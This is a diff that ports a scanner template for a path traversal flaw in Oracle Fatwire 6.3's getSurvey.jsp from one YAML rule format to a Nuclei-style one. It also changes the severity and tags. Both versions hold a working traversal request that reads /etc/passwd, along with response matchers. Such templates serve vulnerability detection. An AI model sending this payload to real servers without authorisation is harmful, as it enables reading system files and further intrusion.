@@ -3,17 +3,24 @@ id: oracle-fatwire-lfi
 info:
   name: Oracle Fatwire 6.3 - Path Traversal
   author: Bernardo Rodrigues @bernardofsr
-  severity: high
-  description: |
-    Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint.
-    app="Oracle-FatWire-Content-Server"
+  severity: critical
+  description: Oracle Fatwire 6.3 suffers from a path traversal vulnerability in the getSurvey.jsp endpoint
   reference:
     - https://www.exploit-db.com/exploits/50167
+  tags: lfi,oracle,fatwire
 
-rules:
-  r0:
-    request:
-      method: GET
-      path: /cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
-    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0()
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cs/career/getSurvey.jsp?fn=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
